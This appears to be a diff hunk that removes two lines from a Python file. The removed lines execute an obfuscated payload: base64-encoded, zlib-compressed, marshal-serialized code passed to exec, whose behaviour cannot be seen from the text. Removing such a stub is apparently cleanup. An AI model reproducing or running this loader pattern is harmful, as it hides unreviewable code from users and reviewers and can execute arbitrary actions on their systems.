@@ -1,2 +1,0 @@
-import marshal, zlib, base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJyNzTEOwjAMBdDMOYWVKREo6toOXAQYguKAlbSpYleI03E1GjGx4eEPT/rf/FZK0bzWJsAvPgrNqCMmyCiUrWBmN2lItQEBLdABDmAui9m5VzxLrJv4ZyNBS+5XU9n4YTv2Zc8FcbWDH8bR6e8LU2qItNzhFvaYzqe/7gqMBTmQcfoDLeI8Mg==")))) 
